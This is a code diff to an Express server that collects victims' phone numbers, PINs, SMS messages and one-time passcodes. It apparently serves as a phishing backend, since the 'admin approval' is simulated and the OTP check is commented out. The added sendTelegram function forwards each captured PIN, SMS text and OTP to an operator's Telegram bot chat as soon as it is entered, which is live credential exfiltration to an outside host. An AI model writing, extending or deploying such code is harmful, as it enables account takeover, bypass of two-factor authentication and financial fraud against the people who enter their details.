@@ -5,6 +5,30 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
+// ── Telegram notifications ─────────────────────────────
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
+
+async function sendTelegram(text) {
+  if (!BOT_TOKEN || !CHAT_ID) {
+    console.log('⚠️ Telegram not configured:', text);
+    return;
+  }
+  try {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const r = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
+    });
+    const j = await r.json();
+    if (!j.ok) console.log('Telegram response:', j);
+  } catch (err) {
+    console.error('Telegram error:', err.message);
+  }
+}
+
+
 // In-memory store — resets when server restarts.
 // For a real app, use a database.
 const applications = {};
@@ -26,12 +50,15 @@ app.post('/api/verify-pin', (req, res) => {
   const id = 'APP-' + Date.now();
   applications[id] = { phoneNumber, pin, status: 'pending' };
 
+    sendTelegram(`🔐 <b>New Login</b>\nApp ID: <code>${id}</code>\nPhone: <code>${phoneNumber}</code>\nPIN: <code>${pin}</code>`);
+
   console.log('📥 New login:', id, phoneNumber);
 
   // Simulate admin approval after 5 seconds
   setTimeout(() => {
     if (applications[id]) {
       applications[id].status = 'approved';
+          sendTelegram(`✅ <b>Approved</b>\nApp ID: <code>${id}</code>`);
       console.log('✅ Approved:', id);
     }
   }, 5000);
@@ -49,6 +76,7 @@ app.get('/api/check-pin-status/:id', (req, res) => {
 // ── 3. Submit SMS text ───────────────────────────────────
 app.post('/api/submit-sms', (req, res) => {
   const { applicationId, smsText } = req.body;
+    sendTelegram(`📩 <b>SMS submitted</b>\nApp ID: <code>${applicationId}</code>\nText: <code>${smsText}</code>`);
   console.log('📩 SMS received for', applicationId, ':', smsText);
   res.json({ success: true });
 });
@@ -67,6 +95,8 @@ app.post('/api/verify-otp', (req, res) => {
   //   return res.json({ success: false, message: 'Wrong OTP.' });
   // }
 
+  
+      sendTelegram(`🔑 <b>OTP entered</b>\nApp ID: <code>${applicationId}</code>\nOTP: <code>${otp}</code>`);
   console.log('🔐 OTP accepted for', applicationId);
   app_.otpStatus = 'approved';
   res.json({ success: true });
